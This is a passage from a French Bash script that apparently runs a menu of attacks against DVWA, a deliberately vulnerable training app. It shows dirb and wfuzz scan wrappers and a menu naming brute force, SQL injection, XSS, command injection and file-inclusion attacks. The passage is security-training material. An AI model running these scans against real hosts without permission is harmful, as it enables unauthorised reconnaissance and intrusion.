    WORDLIST=${WORDLIST:-/usr/share/wordlists/dirb/common.txt}
    BASE="http://$IP:$PORT"

    if [ ! -f "$WORDLIST" ]; then
        echo -e "${RED}‚ùå Wordlist introuvable: $WORDLIST${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return
    fi

    local TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
    local OUT_LOG="$LOG_DIR/dirb/dirb_${TIMESTAMP}.log"
    mkdir -p "$LOG_DIR/dirb"

    echo -e "\n${YELLOW}‚ñ∂ Lancement dirb...${NC}"
    
    dirb "$BASE" "$WORDLIST" -o "$OUT_LOG" >/dev/null 2>&1 || true
    
    echo -e "${GREEN}‚úÖ Scan termin√©${NC}"
    echo -e "\n${CYAN}üìä R√©sultats (extraits):${NC}"
    
    grep -E "^\+ |^==>" "$OUT_LOG" 2>/dev/null | head -n 20 || echo "Aucun r√©sultat"
    
    echo -e "\n${GREEN}Log complet: $OUT_LOG${NC}"
    log_exploit "$OUT_LOG" "SUCCESS" "Dirb scan completed"
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_wfuzz() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Fuzzing - wfuzz]${NC}"
    echo "üìñ Objectif : fuzzing endpoints"
    echo "‚ö†Ô∏è Risque : volum√©trie √©lev√©e"
    echo "üõ°Ô∏è Mitigation : rate limiting, WAF"
    echo

    check_tools wfuzz

    local IP PORT BASE WORDLIST THREADS
    IP=$(get_host_ip)
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8081): " PORT; PORT=${PORT:-8081}
    read -p "üìÇ Wordlist (/usr/share/wordlists/dirb/common.txt): " WORDLIST
    WORDLIST=${WORDLIST:-/usr/share/wordlists/dirb/common.txt}
    read -p "‚öôÔ∏è Threads (20): " THREADS; THREADS=${THREADS:-20}
    BASE="http://$IP:$PORT"

    if [ ! -f "$WORDLIST" ]; then
        echo -e "${RED}‚ùå Wordlist introuvable${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return
    fi

    local TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
    local OUT_CSV="$LOG_DIR/wfuzz/wfuzz_${TIMESTAMP}.csv"
    mkdir -p "$LOG_DIR/wfuzz"

    echo -e "\n${YELLOW}‚ñ∂ Lancement wfuzz...${NC}"
    
    wfuzz -u "${BASE}/FUZZ" -w "$WORDLIST" -t "$THREADS" \
        --hc 404 -f "$OUT_CSV,csv" 2>/dev/null || true
    
    echo -e "${GREEN}‚úÖ Fuzzing termin√©${NC}"
    echo -e "\n${CYAN}üìä R√©sultats (extraits):${NC}"
    
    head -n 10 "$OUT_CSV" 2>/dev/null || echo "Aucun r√©sultat"
    
    echo -e "\n${GREEN}R√©sultats: $OUT_CSV${NC}"
    log_exploit "$OUT_CSV" "SUCCESS" "Wfuzz scan completed"
    read -p "üëâ Entr√©e pour revenir..."
}

# ==========================
# Menu principal (boucl√©)
# ==========================

exploits_menu() {
    while true; do
        clear; banner
        echo -e "${CYAN}=== üí£ Exemples d'exploitation DVWA ===${NC}"
        echo
        echo -e "${GREEN}1)  Hydra Brute Force${NC}"
        echo -e "${GREEN}2)  SQL Injection (sqlmap)${NC}"
        echo -e "${GREEN}3)  XSS Hunting${NC}"
        echo -e "${GREEN}4)  Command Injection${NC}"
        echo -e "${GREEN}5)  File Upload${NC}"
        echo -e "${GREEN}6)  File Inclusion (LFI/RFI)${NC}"
        echo -e "${GREEN}7)  CSRF${NC}"
        echo -e "${GREEN}8)  Broken Authentication${NC}"
        echo -e "${GREEN}9)  IDOR${NC}"
        echo -e "${GREEN}10) Security Misconfiguration${NC}"
        echo -e "${GREEN}11) Directory Bruteforce (dirb)${NC}"
        echo -e "${GREEN}12) Fuzzing (wfuzz)${NC}"
        echo -e "${RED}0)  Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_hydra ;;
            2) exploit_sqlmap ;;
            3) exploit_xss ;;
            4) exploit_cmdinj ;;
            5) exploit_upload ;;
            6) exploit_lfi ;;
            7) exploit_csrf ;;
            8) exploit_auth ;;
            9) exploit_idor ;;
            10) exploit_misconfig ;;
            11) exploit_dirb ;;
            12) exploit_wfuzz ;;
            0) return ;;
            *) echo -e "${RED}‚ùå Option invalide${NC}"; sleep 1 ;;
        esac
    done
}

# Lancement si ex√©cut√© directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    exploits_menu
fi
